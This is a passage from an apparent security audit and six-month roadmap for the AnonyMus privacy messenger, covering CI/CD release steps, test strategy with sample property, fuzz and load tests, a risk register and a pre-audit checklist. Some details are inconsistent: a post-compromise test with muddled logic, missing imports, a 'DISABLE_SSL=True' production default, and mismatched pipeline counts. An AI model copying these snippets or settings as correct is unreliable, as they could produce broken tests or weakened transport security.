      - run: docker push ghcr.io/aryansinghnagar/anonymus:${{ github.ref_name }}
      - run: docker push ghcr.io/aryansinghnagar/anonymus:latest

      - working-directory: android
        run: ./gradlew assembleRelease bundleRelease
      - working-directory: android
        run: ./gradlew signReleaseBundle  # uses keystore from secrets

      - working-directory: launcher
        run: python build.py  # produces NetworkDiagnosticsInstaller.exe

      # Generate changelog
      - uses: mikepenz/release-changelog-builder-action@v5
        id: changelog
        with:
          configuration: .github/changelog-config.json
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # Create release
      - uses: softprops/action-gh-release@v2
        with:
          body: ${{ steps.changelog.outputs.changelog }}
          prerelease: ${{ contains(github.ref_name, 'rc') }}
          files: |
            android/app/build/outputs/apk/release/*.apk
            android/app/build/outputs/bundle/release/*.aab
            launcher/Output/NetworkDiagnosticsInstaller.exe
            sbom-python.json
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### 11.7 Branch Protection Rules

Configure on GitHub:

- `main` branch: require PR review (1 reviewer), require status checks (all 6 pipelines), require signed commits, dismiss stale reviews on push, require linear history.
- Tag protection: only `release-bot` can push `v*` tags.
- Required status checks: `lint`, `test`, `security`, `docker`, `android/test`, `android/build`, `js/lint`, `js/test`.

### 11.8 Secrets Management

- `FLASK_SECRET_KEY`, `ANONYMUS_ADMIN_PASSWORD`, `DATABASE_URL`, `REDIS_URL` — never in repo; use GitHub Actions secrets for CI, `.env` (gitignored) for local dev, OS keychain for the launcher.
- Android signing keystore — stored as a base64-encoded GitHub Actions secret; decoded in the release workflow.
- PyPI / npm publish tokens — stored as GitHub Actions secrets, used only on tag pushes.

---

## 12. Testing Strategy

The current test suite has 4 Python files + 1 JS file + 1 Kotlin file, with zero coverage of routes, sockets, crypto-via-server, error paths, or mode switching. The target is a SimpleX-grade testing regime: unit + integration + property-based + fuzz + E2E + security + load + schema-drift, with 90% line coverage on `core/`, 80% on `transports/`, 70% on `web/` JS, 70% on Android.

### 12.1 Test Pyramid

```
                    ┌─────────┐
                    │  E2E    │  ~20 tests, 2 real clients through relay + Tor
                    └────┬────┘
                ┌────────┴────────┐
                │  Integration    │  ~80 tests, Flask test client + Socket.IO
                └────────┬────────┘
            ┌───────────┴───────────┐
            │  Property + Fuzz      │  hypothesis + atheris, 10k iterations each
            └───────────┬───────────┘
        ┌──────────────┴──────────────┐
        │      Unit                   │  ~500 tests, pytest + unittest
        └─────────────────────────────┘
```

### 12.2 Unit Tests (target: 500 tests, 90% line coverage on `core/`)

Per-module targets:

| Module | Target coverage | Key tests |
|---|---|---|
| `core/crypto.py` | 100% | KAT vectors, round-trip, fail-closed on bad key |
| `core/double_ratchet.py` (new) | 100% | KAT vectors from Signal spec, DH ratchet every message, post-compromise recovery |
| `core/queue_cryptobox.py` (new) | 100% | Round-trip, ciphertext differs across queues |
| `core/logging.py` | 95% | `RedactingFilter` redacts `record.args`; PII patterns |
| `core/transport_registry.py` | 90% | Mode switch, concurrent access |
| `core/security_headers.py` | 95% | Every header present; CSP format |
| `transports/relay/database.py` | 85% | Register, login, timing oracle, SQL injection attempts |
| `transports/relay/server.py` | 75% (routes) | Every route, auth, CSRF, rate limit |
| `transports/p2p/database.py` | 85% | Encrypt/decrypt round-trip, contact lifecycle |
| `transports/p2p/server.py` | 75% (routes) | Every route, input validation, error handling |
| `transports/p2p/tor_manager.py` | 70% | GPG verification, path traversal, download failure |

### 12.3 Integration Tests (target: 80 tests, 80% coverage on `transports/`)

Use Flask's test client + `socketio.test_client`. Key scenarios:

1. **End-to-end encrypted message exchange (relay mode).** Two test clients register, establish a queue, exchange 10 encrypted messages, assert all are received and decrypted correctly.
2. **End-to-end encrypted message exchange (P2P mode).** Same, but with two P2P servers on different ports, each with a mock onion address.
3. **Mode switching.** Start in relay, switch to P2P, assert all WS connections drop, assert in-flight messages are re-delivered on reconnect (after HIGH-11 fix).
4. **Rate-limit flood.** Send 100 messages in 1 second, assert rate limiter kicks in after the configured threshold.
5. **Malformed P2P payload.** Send `/p2p/message` with `timestamp="not-a-number"`, assert 400 (not 500) response.
6. **CSRF rejection.** POST without `X-CSRF-Token`, assert 400.
7. **`/api/mode` auth.** POST without admin password, assert 403.
8. **Session expiry.** Use a cookie older than 8 hours, assert 401 on next request.
9. **`RedactingFilter`.** Log a message with a Base64 string in `args`, assert the output is redacted.
10. **Schema drift.** Run all Alembic migrations on a fresh DB, dump schema, diff against `schema.sql` (per HIGH-7).

### 12.4 Property-Based Tests (target: 20 properties, using `hypothesis`)

```python
# tests/property/test_double_ratchet.py
from hypothesis import given, strategies as st
from core.double_ratchet import DoubleRatchet

@given(
    message=st.text(min_size=1, max_size=10000),
    num_messages=st.integers(min_value=1, max_value=100),
)
def test_dr_roundtrip(message, num_messages):
    alice, bob = DoubleRatchet.new_pair()
    for _ in range(num_messages):
        ct = alice.encrypt(message)
        assert bob.decrypt(ct) == message
        # Reverse direction
        ct2 = bob.encrypt(message)
        assert alice.decrypt(ct2) == message

@given(
    compromise_at=st.integers(min_value=0, max_value=50),
)
def test_post_compromise_recovery(compromise_at):
    """After Alice's state is compromised, Bob's next message should
    trigger a DH ratchet that restores security."""
    alice, bob = DoubleRatchet.new_pair()
    for i in range(100):
        if i == compromise_at:
            alice_state = alice.snapshot()  # attacker steals state
        ct = alice.encrypt(f"msg {i}")
        assert bob.decrypt(ct) == f"msg {i}"
    # After Bob sends a message, Alice ratchets, state is useless
    ct = bob.encrypt("recovery")
    alice.decrypt(ct)
    # Old alice_state can no longer decrypt new messages
    old_alice = DoubleRatchet.restore(alice_state)
    ct2 = alice.encrypt("post-recovery")
    with pytest.raises(DecryptionError):
        old_alice.decrypt(ct2)
```

### 12.5 Fuzz Tests (target: 10,000 iterations per endpoint, using `atheris`)

```python
# tests/fuzz/test_p2p_endpoints.py
import atheris
import sys

with atheris.instrument_imports():
    import server

def test_one_input(data):
    """Fuzz every /p2p/* endpoint with random JSON payloads."""
    try:
        payload = json.loads(data.decode('utf-8', errors='ignore'))
    except json.JSONDecodeError:
        return
    client = server.app.test_client()
    for endpoint in ['/p2p/handshake', '/p2p/accept', '/p2p/message']:
        try:
            r = client.post(endpoint, json=payload)
            assert r.status_code != 500, f"500 on {endpoint} with payload {payload}"
        except Exception as e:
            # Log but don't fail — we want to find crashes, not catch them
            print(f"Crash on {endpoint}: {e}")

atheris.Setup(sys.argv, test_one_input)
atheris.Fuzz()
```

### 12.6 E2E Tests (target: 20 tests, 2 real clients through relay + Tor)

Use Playwright for the web client and a headless Android emulator for the Android client. Key scenarios:

1. **Two web clients through a relay.** Browser A registers, Browser B registers, they exchange an invite link, exchange 5 messages, assert all are received.
2. **Web client + Android client through a relay.** Same, but with the Android emulator.
3. **Two P2P clients through Tor.** Start two P2P servers, each with a real (but local) Tor hidden service, exchange messages.
4. **File transfer.** Send a 10 MB file, assert it is received and SHA-256 matches.
5. **Voice call.** Two web clients, establish a WebRTC call, assert media flows (use a fake media stream).
6. **Group chat.** Three clients, create a group, exchange messages, assert all receive.
7. **Disappearing messages.** Send a message with 5s TTL, wait 10s, assert it is deleted on both sides.
8. **Mode switch.** Two clients chatting in relay mode, switch to P2P, assert they can reconnect and resume.

### 12.7 Security Tests (target: 30 tests)

- OWASP ZAP scan of the relay in CI (fail on High+ findings).
- `bandit` on all Python (already in 11.1).
- `semgrep` with the `p/owasp-top-ten` ruleset.
- Manual CSRF / XSS / SQLi / SSRF test cases in `tests/security/`.

### 12.8 Load Tests (target: 1000 concurrent connections)

Use `locust`:

```python
# tests/load/locustfile.py
from locust import HttpUser, task, between

class ChatUser(HttpUser):
    wait_time = between(1, 5)
    def on_start(self):
        self.client.post('/register', json={'username': f'user_{self.environment.runner.user_count}', 'password': 'test1234'})
        self.client.post('/login', json={'username': f'user_{self.environment.runner.user_count}', 'password': 'test1234'})

    @task
    def send_message(self):
        self.client.post('/api/messages/send', json={'recipient': 'user_1', 'ciphertext': 'a' * 1024})
```

Target: 1000 concurrent users, <1s p99 latency, <5% error rate.

### 12.9 Schema Migration Tests (per HIGH-7)

```python
# tests/unit/test_schema_drift.py
def test_schema_matches_migrations():
    """Apply all migrations to a fresh DB, dump schema, diff against schema.sql."""
    fresh = create_fresh_db_via_migrations()
    actual = dump_schema(fresh)
    expected = (Path(__file__).parent.parent.parent / "schema.sql").read_text()
    assert actual == expected, "schema.sql is out of date — run `make schema`"

def test_migration_backward_compatibility():
    """Apply migrations up to v5, insert test data, apply v6+, assert data preserved."""
    db = create_db_at_migration("v5")
    db.execute("INSERT INTO contacts (...) VALUES (...)")
    db = apply_migrations_after(db, "v5")
    assert db.execute("SELECT COUNT(*) FROM contacts").fetchone()[0] == 1
```

### 12.10 Coverage Targets Summary

| Component | Current | Target (Q1) | Target (Q3) |
|---|---|---|---|
| `core/` | ~10% | 90% | 95% |
| `transports/relay/` | ~15% | 75% | 85% |
| `transports/p2p/` | ~10% | 75% | 85% |
| `web/static/*.js` | ~5% | 60% | 75% |
| Android (`android/`) | ~5% | 60% | 75% |
| `launcher/` | 0% | 50% | 70% |

---

## 13. 6-Month Roadmap with Milestones

The roadmap is structured as three 2-month quarters, each with a theme, monthly milestones, deliverables, exit criteria, owner suggestions, dependencies, and risks.

### 13.1 Q1 (Months 1-2) — Stabilize & Secure

**Theme:** Fix all P0 and P1 findings, stand up CI/CD, achieve 80% test coverage on `core/`. Ship a "beta" tag for a closed pilot at the end of Q1.

#### Month 1: P0 Hotfixes + CI/CD Foundation

| Week | Deliverable | Owner | Dependency |
|---|---|---|---|
| 1 | CRIT-1, CRIT-2, HIGH-1, HIGH-3, HIGH-4 fixes merged | Backend eng | — |
| 1 | GitHub Actions: `python.yml`, `js.yml` live | DevOps | — |
| 2 | HIGH-2, HIGH-5, HIGH-6, HIGH-8, HIGH-9, HIGH-14 fixes merged | Backend eng | — |
| 2 | GitHub Actions: `android.yml`, `sbom.yml` live | DevOps | — |
| 3 | HIGH-7 (Alembic), HIGH-10 (input validation), HIGH-11 (handoff removal) | Backend eng | — |
| 3 | Branch protection rules enforced | DevOps | CI live |
| 4 | HIGH-12 (test coverage sprint, 500 unit tests) | Backend eng + QA | — |
| 4 | `docs/rfcs/` created with backfill (10.K.1) | Tech lead | — |

**Month 1 exit criteria:**
- All CRIT and HIGH findings have merged PRs.
- CI passes on `main` with 80% coverage on `core/`.
- `pip-audit` clean.
- 10 RFCs backfilled in `docs/rfcs/`.

#### Month 2: P1 Wrap-Up + Beta Release

| Week | Deliverable | Owner | Dependency |
|---|---|---|---|
| 5 | HIGH-13 (Tor GPG verify) | Backend eng | — |
| 5 | MED-1, MED-4, MED-5, MED-7, MED-8, MED-9 fixes | Backend eng | — |
| 6 | MED-11, MED-12, MED-13, MED-14, MED-15 fixes | Backend eng + Android eng | — |
| 6 | E2E test suite (20 tests) passing | QA | HIGH-12 done |
| 7 | 10.K.3 Reproducible builds CI job live | DevOps | — |
| 7 | 10.J.3 Terminal CLI shipped | Backend eng | — |
| 7 | 10.J.6 Python SDK shipped (publish to PyPI) | Backend eng | — |
| 8 | `v0.9.0-beta` tag cut, release pipeline runs | DevOps | All above |
| 8 | Closed pilot with 10 users | Product | Beta tag |

**Month 2 exit criteria:**
- `v0.9.0-beta` released with signed artifacts + SBOM.
- Closed pilot launched; no Critical or High severity bugs reported.
- Reproducible build verification passing.

**Q1 risks:**
- Test coverage sprint may slip if the codebase has more dead code than expected. Mitigation: delete dead code first (LOW-6, LOW-7, LOW-8, LOW-9 — quick wins).
- Alembic migration may surface schema bugs. Mitigation: dedicate a full week to migration testing.

### 13.2 Q2 (Months 3-4) — Architectural Upgrades

**Theme:** Implement the SimpleX-inspired architectural upgrades: pairwise pseudonyms, layered E2E (Double Ratchet + NaCl cryptobox), `tlsunique` channel binding, in-memory server storage, self-hostable relays. Ship `v0.10.0-alpha` with the new architecture.

#### Month 3: Identifier Model + Server Architecture

| Week | Deliverable | Owner | Dependency |
|---|---|---|---|
| 9 | 10.A.1 Pairwise per-connection pseudonyms (schema + invite flow) | Backend eng | — |
| 9 | 10.B.3 `tlsunique` channel binding | Backend eng | — |
| 10 | 10.B.4 16 KB padding + 10.B.5 Safety number | Backend eng | — |
| 10 | 10.C.1 In-memory storage + delete-on-delivery | Backend eng | 10.A.1 |
| 11 | 10.C.2 Self-hostable relays (install.sh + docs) | DevOps | 10.C.1 |
| 11 | 10.D.1 Disappearing messages | Backend eng | — |
| 12 | Migration path for existing users (v0.9 → v0.10) | Backend eng | All above |

**Month 3 exit criteria:**
- Pairwise pseudonyms live; `users` table deprecated.
- Relay servers store nothing persistently except queue records.
- Self-host install documented and tested on a fresh Ubuntu 24.04 box.
- Disappearing messages work end-to-end.

#### Month 4: Cryptographic Upgrades + Alpha Release

| Week | Deliverable | Owner | Dependency |
|---|---|---|---|
| 13 | 10.B.1 Double Ratchet + per-queue NaCl cryptobox | Crypto eng | 10.A.1 |
| 13 | 10.A.2 Incognito mode | Backend eng | 10.A.1 |
| 14 | Cross-platform DR parity (web + Android) | Crypto eng + Frontend eng + Android eng | 10.B.1 |
| 14 | 10.B.2 PQ key exchange (ML-KEM-768 hybrid) | Crypto eng | 10.B.1 |
| 15 | 10.H.1 Android background push service | Android eng | — |
| 15 | 10.H.3 Notification queue | Backend eng | — |
| 16 | `v0.10.0-alpha` tag cut | DevOps | All above |

**Month 4 exit criteria:**
- Double Ratchet live; old chain ratchet deprecated.
- PQ key exchange opt-in (behind a feature flag).
- Android push notifications work without FCM.
- `v0.10.0-alpha` released; pilot users migrated.

**Q2 risks:**
- Double Ratchet implementation has subtle bugs. Mitigation: property-based tests (12.4) + commission the external audit early (book Trail of Bits for month 6).
- PQ crypto adds envelope size; may break the 16 KB block budget. Mitigation: implement compressed message format first.
- Android background service may be killed by OEM battery optimizers (notoriously, Xiaomi, Huawei). Mitigation: use `WorkManager` + `AlarmManager` + `ForegroundService` + document the "don't kill my app" guidance.

### 13.3 Q3 (Months 5-6) — Feature Parity Sprint + Audit

**Theme:** Ship the remaining SimpleX features (files, groups, voice/video, multi-device), run the external crypto audit, publish the transparency page, and cut `v1.0.0` production release.

#### Month 5: Files + Groups + Voice/Video

| Week | Deliverable | Owner | Dependency |
|---|---|---|---|
| 17 | 10.E.1 XFTP file protocol (chunked, E2E) | Backend eng | 10.C.1 |
| 17 | 10.D.2 Live messages + 10.D.3 Reactions | Frontend eng | — |
| 18 | 10.E.2 Recipient-chosen file relays | Backend eng | 10.E.1 |
| 18 | 10.D.4 Edit history + 10.D.5 Full delete + 10.D.6 Receipts | Backend eng + Frontend eng | — |
| 19 | 10.F.1 Decentralized groups (pairwise queues) | Backend eng | 10.A.1, 10.B.1 |
| 19 | 10.F.2 Rotating group IDs + 10.F.3 Member roles | Backend eng | 10.F.1 |
| 20 | 10.G.1 WebRTC voice/video | Frontend eng + Android eng | 10.B.1 |
| 20 | 10.G.2 Voice messages + 10.G.3 Video messages | Frontend eng + Android eng | 10.E.1 |

**Month 5 exit criteria:**
- File transfer works up to 1 GB.
- Groups up to 50 members work.
- Voice/video calls work between two web clients and between web + Android.
- Voice/video messages work.

#### Month 6: Audit + Transparency + 1.0 Release

| Week | Deliverable | Owner | Dependency |
|---|---|---|---|
| 21 | 10.D.7 Message batching | Backend eng | — |
| 21 | 10.A.3 Hidden profiles + 10.A.4 Multiple profiles | Backend eng + Android eng | 10.A.1 |
| 22 | External crypto audit begins (Trail of Bits or NCC) | Tech lead | 10.B.1 stable |
| 22 | 10.C.3 Tor hidden-service relay option + 10.C.4 Transparency page | Backend eng + DevOps | — |
| 23 | Audit findings triaged; Critical/High fixes merged | Crypto eng + Backend eng | Audit report |
| 23 | 10.J.4 TypeScript SDK published to npm | Frontend eng | — |
| 24 | `v1.0.0` tag cut; release blog post; transparency report published | DevOps + Product | All above |

**Month 6 exit criteria:**
- External audit complete; all High+ findings fixed.
- Transparency page live.
- TypeScript SDK on npm.
- `v1.0.0` released with signed artifacts + SBOM + reproducible build verification.

**Q3 risks:**
- External audit may find High-severity crypto bugs (SimpleX's 2022 audit found an X3DH KDF bug). Mitigation: budget 2 weeks for post-audit fixes; do not commit to a hard 1.0 date.
- WebRTC over Tor may have unacceptable latency. Mitigation: document that voice/video requires relay mode or direct LAN; do not advertise Tor-mode calls.
- Groups (O(N²) connections) may not scale beyond 50 members. Mitigation: document the limit; consider a relayed-group model for larger groups in v1.1.

### 13.4 Post-1.0 (Q4 and beyond)

Not in the 6-month scope but planned:

- 10.J.1 iOS client (8 weeks)
- 10.J.2 Desktop client (5 weeks)
- 10.I.1 Mobile ↔ desktop linking (4 weeks)
- 10.H.2 iOS NSE (3 weeks, depends on iOS client)
- 10.J.5 Node.js native SDK (3 weeks)
- 10.K.5 Content moderation (2 weeks)
- 10.K.6 Supporter badges (2 days)
- 10.K.7 Channels (1 week)

These constitute the `v1.1` release, targeting months 7-10.

### 13.5 Roadmap Gantt Summary

```
Month:  1    2    3    4    5    6
        ─────────────────────────────
Q1      ████████████                  Stabilize & Secure (P0+P1, CI/CD, tests)
        beta tag at end of month 2
Q2                  ████████████      Architectural Upgrades (pairwise, DR, in-memory)
                    alpha tag at end of month 4
Q3                              ████████████  Feature Parity + Audit
                                1.0 tag at end of month 6
```

---

## 14. Risk Register, Pre-Audit Checklist & Closing

### 14.1 Risk Register

A living risk register. Each risk has an owner, likelihood, impact, mitigation, and residual risk. Review monthly.

| ID | Risk | Likelihood | Impact | Owner | Mitigation | Residual |
|---|---|---|---|---|---|---|
| R-01 | Hidden Flask secret still ships in a build | Low | Critical | Backend eng | Runtime guard (CRIT-1 fix) + CI grep check | Low |
| R-02 | `db_key` leaks via a new code path | Medium | Critical | Backend eng | Server-side session storage (CRIT-2 fix) + lint rule banning `session['db_key']` | Low |
| R-03 | XSS re-introduced via new `innerHTML` | Medium | High | Frontend eng | ESLint `no-innerHTML` rule + code review | Low |
| R-04 | CVE in a pinned dependency slips past CI | Medium | High | DevOps | `pip-audit` in CI (11.1) + Dependabot alerts | Medium |
| R-05 | Double Ratchet implementation has a subtle bug | Medium | Critical | Crypto eng | Property-based tests (12.4) + external audit (month 6) | Medium |
| R-06 | PQ crypto library (liboqs) has an undiscovered flaw | Medium | High | Crypto eng | Hybrid mode (X25519 + ML-KEM); PQ is additive, not replacement | Medium |
| R-07 | Tor binary download is compromised despite GPG | Low | Critical | Backend eng | GPG verify (HIGH-13) + pin Tor signing key fingerprint | Low |
| R-08 | Android OEM kills background push service | High | Medium | Android eng | Foreground service + WorkManager + "don't kill my app" docs | Medium |
| R-09 | WebRTC over Tor has unacceptable latency | High | Medium | Frontend eng | Document relay-mode-only for calls; do not advertise Tor calls | Low |
| R-10 | Groups beyond 50 members degrade performance | High | Medium | Backend eng | Cap at 50; document; v1.1 relayed-group model | Medium |
| R-11 | External audit finds High-severity crypto bug | Medium | High | Tech lead | Budget 2 weeks for fixes; do not hard-commit 1.0 date | Medium |
| R-12 | Insider developer ships a backdoor | Low | Critical | Tech lead | Reproducible builds (10.K.3) + signed releases + two-person review | Low |
| R-13 | mDNS leak re-enabled by accident | Low | Medium | Backend eng | Default off; CI test asserts `ANONYMUS_MDNS` env var is unset in prod config | Low |
| R-14 | Alembic migration corrupts existing user data | Medium | High | Backend eng | Migration tests (12.9) + backup-before-migrate docs | Low |
| R-15 | Rate limiter bypass via Tor IP sharing | Medium | Medium | Backend eng | Per-peer-token rate limit (MED-6 fix) | Low |
| R-16 | CSP `unsafe-inline` weakens XSS defense | Medium | Medium | Frontend eng | Move inline styles to external CSS; strict CSP | Low |
| R-17 | `pip-audit` false positive blocks CI | Medium | Low | DevOps | `--ignore-vuln` for confirmed FPs; weekly review | Low |
| R-18 | Schema drift between SQLite and Postgres | Low | Medium | Backend eng | Per-12.9 drift tests for both backends | Low |
| R-19 | Android alpha dependency (`androidx.security.crypto:1.1.0-alpha06`) breaks | Medium | Medium | Android eng | Pin to stable 1.0.0 (MED-18 fix) | Low |
| R-20 | Pilot users hit a data-loss bug | Medium | High | Backend eng | E2E tests + daily DB backup in pilot | Medium |

### 14.2 Pre-Audit Checklist

Run this checklist before engaging the external crypto auditor (month 6). The auditor's time is expensive — every item checked off here is an hour saved.

#### Code & Dependencies

- [ ] All CRIT and HIGH findings (Sections 5-6) have merged PRs with tests.
- [ ] All MED findings (Section 7) have merged PRs or documented acceptances.
- [ ] `pip-audit` is clean on `requirements.txt` and `requirements-dev.txt`.
- [ ] `bandit -ll` is clean on `core/` and `transports/`.
- [ ] `safety check` is clean.
- [ ] `semgrep --config p/owasp-top-ten` is clean.
- [ ] No `print()` in non-test Python code (lint rule `T20` enforced).
- [ ] No `innerHTML` for untrusted data in `web/static/*.js` (ESLint `no-innerHTML` rule).
- [ ] No `e.printStackTrace()` in Android production code (Timber only).
- [ ] No bare `except Exception` without logging (lint rule).
- [ ] No `session['db_key']` anywhere (lint rule).
- [ ] No hardcoded secrets (CI grep for common patterns).

#### Tests & Coverage

- [ ] `pytest --cov=core --cov-fail-under=90` passes.
- [ ] `pytest --cov=transports --cov-fail-under=80` passes.
- [ ] E2E test suite (20 tests) passes.
- [ ] Fuzz tests (10,000 iterations per `/p2p/*` endpoint) pass with no crashes.
- [ ] Property-based tests for the Double Ratchet pass (`hypothesis`).
- [ ] Schema drift tests pass for both SQLite and Postgres.
- [ ] OWASP ZAP scan of the relay has no High+ findings.
- [ ] Load test: 1000 concurrent users, <1s p99, <5% error rate.

#### Documentation & Process

- [ ] `docs/rfcs/` has an RFC for every architectural decision (target: 30+ RFCs).
- [ ] `docs/SECURITY.md` published with PGP key, severity matrix, disclosure policy.
- [ ] `docs/TRANSPARENCY.md` template published.
- [ ] `docs/REPRODUCE.md` documents the reproducible-build verification process.
- [ ] `docs/protocol/anonymus.md` specifies the chat protocol with ABNF or JTD schema.
- [ ] `docs/protocol/crypto.md` specifies the E2E crypto with algorithm choices and parameter sizes.
- [ ] `docs/threat-model.md` publishes the STRIDE model from Section 3.
- [ ] `CHANGELOG.md` is auto-generated from conventional commits.
- [ ] `CONTRIBUTING.md` documents code style, commit format, PR checklist.
- [ ] Two-person review enforced on all PRs to `main`.

#### Crypto Specifics

- [ ] Double Ratchet implementation matches the Signal spec (verified via KAT vectors).
- [ ] Per-queue NaCl cryptobox layer added; ciphertext differs across queues (property test).
- [ ] `tlsunique` channel binding verified end-to-end.
- [ ] PQ hybrid (X25519 + ML-KEM-768) key exchange verified; PQ keys rotate on every ratchet step.
- [ ] AES-256-GCM nonces are never reused (property test).
- [ ] PBKDF2 iterations ≥ 600,000; salt is per-install random 16+ bytes.
- [ ] No silent fallback to plaintext in any crypto function (fail-closed verified).
- [ ] Crypto self-test runs at startup; refuses to boot on failure.

#### Operational

- [ ] Reproducible build CI job passes weekly.
- [ ] SBOM generated for every release (Python + Android).
- [ ] Release artifacts are signed (Android APK with release keystore; Docker image with cosign; Windows installer with Authenticode).
- [ ] `docker-compose.yml` includes Caddy with auto-TLS.
- [ ] `DISABLE_SSL=True` is the documented production default.
- [ ] `HEALTHCHECK` in Dockerfile.
- [ ] `.dockerignore` present; multi-stage build; final image <300 MB.
- [ ] Backups: daily encrypted backup of the relay's `queue_records` table (only metadata, not content).

### 14.3 Closing

AnonyMus today is a thoughtful prototype with a sound cryptographic concept and several polished privacy features that SimpleX itself lacks — the dual-mode relay + Tor P2P architecture, the camouflage Windows launcher, the biometric lock, the TOFU certificate pinning, the `FLAG_SECURE` anti-screenshot. The bones are good. What it lacks is production discipline: the 2 critical and 14 high-severity findings in this audit are not exotic — they are the standard consequences of shipping without CI, without an external audit, without a security mindset applied to every PR. Fixing them is straightforward engineering work, and the 6-month roadmap in Section 13 sequences that work into three achievable quarters.

The ambitious goal — integrating every SimpleX feature into AnonyMus without breaking the existing architecture — is also achievable. The integration plan in Section 10 maps each SimpleX feature to a concrete AnonyMus implementation path, with attention to preserving the differentiators that make AnonyMus uniquely valuable. The result, at the end of month 6, is an AnonyMus that is feature-complete against SimpleX, retains its dual-mode architecture and privacy hardening, has passed an external crypto audit, ships reproducible builds, and publishes transparency reports. That is a credible production-grade privacy messenger.

The work begins with week 1: remove the hardcoded Flask secret from the launcher, move `db_key` out of the session cookie, sanitize the `nickname` field, add CSRF tokens, authenticate `/api/mode`, and fix `encrypt_secret()`. Everything else follows.

